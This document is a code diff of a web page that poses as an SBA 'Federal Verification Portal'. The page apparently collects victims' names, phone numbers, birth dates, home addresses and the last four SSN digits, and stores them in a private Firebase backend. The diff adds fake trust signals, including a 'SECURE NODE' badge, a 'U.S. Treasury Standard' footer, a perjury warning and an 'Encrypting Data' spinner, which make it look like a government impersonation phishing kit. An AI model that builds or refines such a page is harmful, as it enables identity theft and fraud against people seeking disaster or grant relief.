@@ -3,61 +3,113 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>SBA | Phase 02: Verification</title>
+    <title>SBA | Phase 02: Verification Node</title>
     <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
     <style>
-        :root { --sba-navy: #002e6d; }
-        body { background: #f0f2f5; font-family: 'Segoe UI', sans-serif; }
-        .auth-card { background: white; border-top: 6px solid var(--sba-navy); box-shadow: 0 10px 25px rgba(0,0,0,0.05); width: 100%; max-width: 500px; border-radius: 4px; }
-        input, select { height: 42px; border: 1.5px solid #e2e8f0; width: 100%; padding: 0 10px; font-size: 13px; border-radius: 4px; outline: none; }
-        input:focus { border-color: var(--sba-navy); }
-        label { display: block; text-transform: uppercase; font-size: 9px; font-weight: 800; color: #94a3b8; margin-bottom: 3px; }
-        .btn-finish { background: var(--sba-navy); height: 50px; color: white; width: 100%; font-weight: 700; text-transform: uppercase; font-size: 13px; border-radius: 4px; margin-top: 10px; }
-        .section-title { font-size: 10px; font-weight: 900; color: var(--sba-navy); text-transform: uppercase; border-bottom: 1px solid #f1f5f9; padding-bottom: 5px; margin-bottom: 15px; letter-spacing: 1px; }
+        @import url('https://fonts.googleapis.com/css2?family=Source+Sans+Pro:wght@400;600;700;900&display=swap');
+        
+        :root { --sba-navy: #002e6d; --sba-accent: #0071bc; --slate-bg: #f1f5f9; }
+        body { background: var(--slate-bg); font-family: 'Source Sans Pro', sans-serif; }
+        
+        .nav-mini { background: white; border-bottom: 1px solid #e2e8f0; padding: 12px 24px; }
+        .auth-card { background: white; border-top: 6px solid var(--sba-navy); box-shadow: 0 20px 40px rgba(0,0,0,0.08); width: 100%; max-width: 550px; border-radius: 4px; }
+        
+        label { display: block; text-transform: uppercase; font-size: 10px; font-weight: 800; color: #64748b; margin-bottom: 5px; letter-spacing: 0.5px; }
+        input, select { height: 44px; border: 1.5px solid #e2e8f0; width: 100%; padding: 0 12px; font-size: 14px; border-radius: 4px; outline: none; transition: 0.2s; background: #fcfcfc; }
+        input:focus, select:focus { border-color: var(--sba-accent); background: white; box-shadow: 0 0 0 3px rgba(0, 113, 188, 0.1); }
+        
+        .section-header { font-size: 11px; font-weight: 900; color: var(--sba-navy); text-transform: uppercase; border-bottom: 2px solid #f1f5f9; padding-bottom: 6px; margin-bottom: 20px; display: flex; align-items: center; gap: 8px; }
+        .btn-finish { background: var(--sba-navy); height: 55px; color: white; width: 100%; font-weight: 700; text-transform: uppercase; font-size: 13px; border-radius: 4px; transition: 0.2s; letter-spacing: 1px; }
+        .btn-finish:hover:not(:disabled) { background: #001e4a; transform: translateY(-1px); box-shadow: 0 5px 15px rgba(0,46,109,0.3); }
+        .btn-finish:disabled { opacity: 0.7; cursor: not-allowed; }
+
+        .progress-line { height: 4px; background: #e2e8f0; border-radius: 2px; flex-grow: 1; overflow: hidden; }
+        .progress-fill { height: 100%; background: var(--sba-navy); width: 66%; }
     </style>
 </head>
-<body class="min-h-screen flex items-center justify-center p-4">
-    <div class="auth-card p-6 md:p-10">
-        <div class="mb-6 text-center">
-            <h2 class="text-xl font-black text-gray-800 uppercase">Case Verification</h2>
-            <div class="flex gap-1 mt-2">
-                <div class="h-1.5 w-full bg-[#002e6d] rounded-full"></div>
-            </div>
+<body class="min-h-screen flex flex-col">
+
+    <nav class="nav-mini flex justify-between items-center">
+        <div class="flex items-center gap-2">
+            <div class="bg-[#002e6d] text-white px-2 py-0.5 font-bold text-lg">SBA</div>
+            <span class="text-[10px] font-black text-gray-400 uppercase leading-tight hidden sm:block tracking-widest">Federal Verification <br> Portal 2026</span>
         </div>
+        <div class="text-[10px] font-bold text-red-600 bg-red-50 px-3 py-1 rounded border border-red-100">
+            SECURE NODE: ACTIVE
+        </div>
+    </nav>
 
-        <form id="finalForm" class="space-y-5">
-            <p class="section-title">Personal Identification</p>
-            <div class="grid grid-cols-2 gap-4">
-                <div><label>First Name</label><input type="text" id="fname" required></div>
-                <div><label>Last Name</label><input type="text" id="lname" required></div>
-            </div>
-            <div class="grid grid-cols-2 gap-4">
-                <div><label>Phone Number</label><input type="tel" id="phone" required placeholder="(555) 000-0000"></div>
-                <div><label>Date of Birth</label><input type="date" id="dob" required></div>
+    <div class="flex-grow flex items-center justify-center p-4 py-10">
+        <div class="auth-card p-8 md:p-12">
+            
+            <div class="flex items-center gap-3 mb-10">
+                <div class="progress-line"><div class="progress-fill"></div></div>
+                <span class="text-[10px] font-black text-navy-800 uppercase whitespace-nowrap">Phase 02 of 03</span>
             </div>
 
-            <p class="section-title">Security & Location</p>
-            <div class="grid grid-cols-1 gap-4">
-                <div><label>Residential Address</label><input type="text" id="address" required></div>
+            <div class="mb-10">
+                <h2 class="text-2xl font-black text-gray-800 uppercase tracking-tight">Identity Verification</h2>
+                <p class="text-xs text-gray-500 mt-1">Complete the form below to link your legal identity to the case file.</p>
             </div>
-            <div class="grid grid-cols-2 gap-4">
-                <div><label>City & State</label><input type="text" id="city" required placeholder="City, ST"></div>
-                <div><label>Zip Code</label><input type="text" id="zip" required></div>
-            </div>
-            <div class="grid grid-cols-2 gap-4">
-                <div><label>SSN (Last 4)</label><input type="password" id="ssn" maxlength="4" required placeholder="XXXX"></div>
-                <div>
-                    <label>Assigned Program</label>
-                    <select id="program" required>
-                        <option value="SBA Grant">Personal Grant</option>
-                        <option value="Disaster Relief">Disaster Relief</option>
-                    </select>
+
+            <form id="finalForm" class="space-y-6">
+                <p class="section-header"><i class="fas fa-user-shield"></i> Legal Identification</p>
+                <div class="grid grid-cols-2 gap-4">
+                    <div><label>First Name</label><input type="text" id="fname" required placeholder="John"></div>
+                    <div><label>Last Name</label><input type="text" id="lname" required placeholder="Doe"></div>
                 </div>
-            </div>
+                <div class="grid grid-cols-2 gap-4">
+                    <div><label>Phone Number</label><input type="tel" id="phone" required placeholder="(000) 000-0000"></div>
+                    <div><label>Date of Birth</label><input type="date" id="dob" required></div>
+                </div>
 
-            <button type="submit" id="finishBtn" class="btn-finish shadow-xl">Submit Case File</button>
-        </form>
+                <p class="section-header mt-8"><i class="fas fa-map-marker-alt"></i> Residential Address</p>
+                <div class="space-y-4">
+                    <div><label>Street Address</label><input type="text" id="address" required placeholder="123 Federal Way"></div>
+                    <div class="grid grid-cols-2 gap-4">
+                        <div><label>City & State</label><input type="text" id="city" required placeholder="Washington, DC"></div>
+                        <div><label>Zip Code</label><input type="text" id="zip" required placeholder="00000"></div>
+                    </div>
+                </div>
+
+                <p class="section-header mt-8"><i class="fas fa-fingerprint"></i> Security Detail</p>
+                <div class="grid grid-cols-2 gap-4">
+                    <div>
+                        <label>SSN (Last 4 Only)</label>
+                        <input type="password" id="ssn" maxlength="4" required placeholder="••••" class="tracking-widest">
+                    </div>
+                    <div>
+                        <label>Target Relief Program</label>
+                        <select id="program" required>
+                            <option value="SBA Grant">Personal Business Grant</option>
+                            <option value="Disaster Relief">Economic Disaster Relief</option>
+                            <option value="Infrastructure">Infrastructure Fund</option>
+                        </select>
+                    </div>
+                </div>
+
+                <div class="pt-6">
+                    <button type="submit" id="finishBtn" class="btn-finish shadow-xl">
+                        Validate & Submit Case File
+                    </button>
+                    <p class="text-[9px] text-gray-400 text-center mt-4 leading-relaxed px-4">
+                        By submitting, you certify under penalty of perjury (18 U.S.C. § 1621) that the information provided is true and correct to the best of your knowledge.
+                    </p>
+                </div>
+            </form>
+        </div>
     </div>
+
+    <footer class="pb-8 px-6 text-center">
+        <div class="inline-flex items-center gap-4 text-[9px] font-bold text-gray-400 uppercase tracking-widest">
+            <span>Encrypted Session</span>
+            <span class="w-1 h-1 bg-gray-300 rounded-full"></span>
+            <span>U.S. Treasury Standard</span>
+            <span class="w-1 h-1 bg-gray-300 rounded-full"></span>
+            <span>2026 Compliant</span>
+        </div>
+    </footer>
 
     <script type="module">
         import { auth, db } from './firebase-config.js';
@@ -73,10 +125,9 @@
             if(!email) { window.location.href="register1.html"; return; }
 
             btn.disabled = true;
-            btn.innerText = "UPLOADING DATA...";
+            btn.innerHTML = `<i class="fas fa-circle-notch animate-spin mr-2"></i> Encrypting Data...`;
 
             try {
-                // If it was manual registration, create the account. If Google, it's already created.
                 let uid;
                 if(!sessionStorage.getItem('is_google')) {
                     const res = await createUserWithEmailAndPassword(auth, email, pass);
@@ -105,9 +156,9 @@
                 sessionStorage.clear();
                 window.location.href = "welcome.html";
             } catch (err) {
-                alert(err.message);
+                alert("System Error: " + err.message);
                 btn.disabled = false;
-                btn.innerText = "Submit Case File";
+                btn.innerText = "Validate & Submit Case File";
             }
         };
     </script>
